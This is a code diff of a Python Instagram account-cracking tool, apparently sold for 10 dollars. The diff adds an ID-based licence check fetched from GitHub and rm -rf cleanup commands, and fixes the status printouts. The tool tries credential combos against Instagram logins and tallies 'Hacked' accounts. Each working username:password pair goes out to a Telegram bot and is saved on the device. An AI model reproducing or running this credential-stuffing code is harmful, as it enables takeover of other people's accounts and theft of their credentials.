@@ -1,3 +1,4 @@
+#Update
 import requests, sys, os, random, time, user_agent
 import os,sys
 os.system('rm -rf .daxl1.py ;rm -rf /sdcard/download/.daxl1.py ;clear')
@@ -10,6 +11,38 @@ error=0
 checkpoint=0
 ##################
 os.system("clear")
+os.system("rm -rf .Cheker.py")
+os.system("cd .. ;cd home ;rm -rf Cheker.py ;clear")
+os.system('clear')
+os.system('rm -rf list.txt')
+os.system('id -u > list.txt')
+uidd = open('list.txt', 'r')
+for j in uidd:
+    sp = j.split()
+
+def chk(): 
+  uuid = str(os.geteuid()) + str(os.getlogin()) 
+  id = "-".join(uuid) 
+  print("\n\n\x1b[37;1mYour ID : "+id) 
+  try: 
+    httpCaht = requests.get("https://raw.githubusercontent.com/MrTLYAKI/list.txt/main/list.txt").text 
+    if id in httpCaht: 
+      print("\033[92mYOUR ID IS ACTIVE.........\033[97m") 
+      msg = str(os.geteuid()) 
+      time.sleep(1) 
+      pass 
+    else: 
+      print("\x1b[91mID ACTIVE NYa bo kren nama bnera @lililliilliil\033[97m") 
+      time.sleep(1) 
+      sys.exit() 
+  except: 
+    sys.exit() 
+    if name == '__main__': 
+     chk() 
+    
+chk()
+
+
 wd = "\033[90;1m" 
 GL = "\033[96;1m"
 BB = "\033[34;1m"
@@ -42,10 +75,7 @@ logo1=G+'''
                           
 
 '''+W+''' ---------------------------------------------------
-'''+wd+'''Author   : TLYAK
- Tool New =======BNX===========
-  Tlegram  : Team_cod3r_1
-  Note : 10$
+'''+wd+'''
  '''+W+'''---------------------------------------------------'''
 logo2=G+'''
 
@@ -63,18 +93,21 @@ logo2=G+'''
                                   
 
 '''+W+''' ---------------------------------------------------
- '''+wd+'''   =======BNX=========
+ '''+wd+'''Author   : TLYAK
+ Tool New =======BNX===========
+  Tlegram  : Team_cod3r_1
+  Note : 10$
 '''+W+''' ---------------------------------------------------
-
+                   =====BNX=====
 '''+W+''' ---------------------------------------------------
- '''+wd+'''  ===Wait=1h=Or=2h======
+ '''+wd+'''   == Wait = 1hmin = 2h ===
 '''+W+''' ---------------------------------------------------
  '''
 print(logo1)
 agar=input(" send good tlegram Y/N ")
 if agar=='y' or agar=='' or agar=='Y' or agar=='' or agar=='':
     ID=input(" ID Telegram :")
-    token=input(" Token : ")
+    token=input(" Token(bot) : ")
 else:
     pass
 print(W+' ---------------------------------------------------')
@@ -140,18 +173,18 @@ def instagram1():
 						os.system("clear")
 						print(logo2)
 						bad+=1
-						print(f' '+W+'['+G+'+'+W+']'+G+'Hacked'+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CP '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+						print(f' '+W+'['+G+'+'+W+']'+G+' Hacked '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CP '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+' Time '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Eror'+W+' :'+B+' '+str(error)+'\n'+wd+' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
 					elif '"message":"Please wait a few minutes before you try again."' in login:
 						os.system("clear")
 						print(logo2)
 						timeout+=1
 						import time
-						print(f' '+W+'['+G+'+'+W+']'+G+' Hacked '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CP '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+' '+W+': '+str+' \n'+W+' ['+B+'-'+W+']'+B+''+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+						print(f' '+W+'['+G+'+'+W+']'+G+' Hacked '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CP '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+' Time '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+''+W+' :'+B+' Eror '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
 					elif 'userId' in login:
 						os.system("clear")
 						print(logo2)
 						hits+=1
-						print(f' '+W+'['+G+'+'+W+']'+G+' Hacked '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CP '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+''+W+': '+str+' \n'+W+' ['+B+'-'+W+']'+B+''+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+						print(f' '+W+'['+G+'+'+W+']'+G+' Hacked '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CP '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+' Time '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+''+W+' :'+B+' Eror '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
 						boooom=f"GOOD: "+user+":"+pasw
 						r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
 						with open('/sdcard/Good(instgram).txt', 'a') as ff:
@@ -160,14 +193,14 @@ def instagram1():
 						os.system("clear")
 						print(logo2)
 						checkpoint+=1
-						print(f' '+W+'['+G+'+'+W+']'+G+' Hacked '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CP '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+' '+W+': '+str+' \n'+W+' ['+B+'-'+W+']'+B+''+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+						print(f' '+W+'['+G+'+'+W+']'+G+' Hacked '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CP '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+' Time '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+''+W+' :'+B+' Eror '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
 					else:
 						os.system("clear")
 						print(logo2)
 						error+=1
-						print(f' '+W+'['+G+'+'+W+']'+G+' Hacked '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CP '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+' '+W+': '+str+' \n'+W+' ['+B+'-'+W+']'+B+''+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+						print(f' '+W+'['+G+'+'+W+']'+G+' Hacked '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CP '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+' Time '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+''+W+' :'+B+' Eror '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
 				except:
-					print(f' '+W+'['+G+'+'+W+']'+G+' Hacked'+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CP '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+''+W+': '+str+' \n'+W+' ['+B+'-'+W+']'+B+''+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+					print(f' '+W+'['+G+'+'+W+']'+G+' Hacked '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CP '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Time'+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+''+W+' :'+B+' Eror '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
 		except FileNotFoundError:
 			print(" [ ! comboka la mobilet a nia ean Path halaya ! ]")
 	loopPp()
